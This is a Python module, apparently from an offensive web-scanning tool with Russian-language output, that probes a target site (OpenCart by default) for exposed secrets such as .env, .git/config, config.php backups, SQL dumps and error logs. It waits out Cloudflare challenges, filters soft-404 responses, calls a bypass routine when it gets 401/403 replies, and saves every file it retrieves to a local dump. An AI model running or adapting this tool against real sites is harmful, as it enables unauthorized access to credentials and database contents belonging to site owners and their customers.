# -*- coding: utf-8 -*-
import hashlib
import os
import time

from core import checks, config, http, stack, ui
from modules import bypass, profiles

FILES = [
    "/config.php", "/config-dist.php", "/admin/config.php",
    "/config.php~", "/config.php.bak", "/config.php.save",
    "/system/storage/logs/error.log", "/storage/logs/error.log",
    "/.env", "/.env.bak", "/.git/config",
    "/backup.sql", "/dump.sql", "/adminer.php", "/phpmyadmin/",
]

CF = ("just a moment", "one moment, please", "cf-browser-verification",
      "checking your browser")


def _sig(r):
    return hashlib.sha1(r.content).hexdigest()


def _title_of(body):
    low = body.lower()
    if "<title>" not in low:
        return ""
    a = low.index("<title>") + 7
    b = low.find("</title>", a)
    if b < 0:
        return ""
    return body[a:b].strip()


def _same(r, title, length):
    if not title:
        return False
    if _title_of(r.text) != title:
        return False
    return abs(len(r.content) - length) < max(2500, length // 20)


def _cf(r):
    if len(r.content) > 25000:
        return False
    t = r.text.lower()
    for x in CF:
        if x in t:
            return True
    return False


def _grab(host, path):
    last = ""
    for i in range(4):
        try:
            r = http.get(host, path, referer="https://" + host + "/")
        except Exception as e:
            return None, str(e).splitlines()[0]
        if _cf(r):
            last = "челлендж"
            time.sleep(3 + i * 2)
            continue
        return r, ""
    return None, last or "челлендж"


def run(host, kind="opencart"):
    home_title, home_len = "", 0
    nf_title, nf_len = "", 0
    try:
        home = http.get(host, "/")
        home_title = _title_of(home.text)
        home_len = len(home.content)
    except Exception:
        pass
    try:
        nf = http.get(host, "/zz_none_%d.html" % int(time.time()))
        nf_title = _title_of(nf.text)
        nf_len = len(nf.content)
    except Exception:
        pass
    ui.say("404: %d байт, заголовок: %s" % (nf_len, nf_title[:50]))
    ui.say("главная: %d байт, заголовок: %s" % (home_len, home_title[:50]))

    hits = []
    for path in profiles.get(kind)["files"]:
        r, err = _grab(host, path)
        if r is None:
            ui.say("%-32s %s" % (path, err))
            continue
        code = r.status_code
        size = len(r.content)
        mark = ""

        if code == 200 and _same(r, home_title, home_len):
            mark = "главная"
        elif code == 200 and _same(r, nf_title, nf_len):
            mark = "404"
        elif code == 200 and size > 20:
            if checks.real(path, r.text):
                mark = "ЕСТЬ"
                hits.append((path, r.text))
            else:
                mark = "пусто"
        elif code in (401, 403):
            v, r2 = bypass.try_path(host, path)
            if r2 is not None and (_same(r2, home_title, home_len)
                                   or _same(r2, nf_title, nf_len)):
                mark = "обход -> пустышка: " + v
                r2 = None
            if r2 is not None and checks.real(path, r2.text):
                mark = "ОБОШЁЛ: " + v
                hits.append((path, r2.text))
            elif r2 is not None:
                mark = "обход пустой"
            else:
                mark = "закрыт"
        ui.say("%-32s %d %7d %s" % (path, code, size, mark))
        time.sleep(0.5)

    tags = stack.guess(host)
    if tags:
        ui.say("движок: " + ", ".join(sorted(tags)))
    extra = bypass.extras(host, tags)
    if extra:
        ui.say("дополнительно:")
        bypass.report(extra)
        for path, kind, body in extra:
            hits.append((path, body))

    if not hits:
        ui.say("пусто, ничего не вытащили")
        return

    dump = os.path.join(config.LOGS, host + "_files.txt")
    with open(dump, "w", encoding="utf-8") as f:
        for path, body in hits:
            f.write("\n===== %s =====\n%s\n" % (path, body))
    ui.say("сохранено: " + dump)
    print()
    for path, body in hits:
        ui.say("--- " + path + " ---")
        ui.say(" ".join(body.split())[:300])
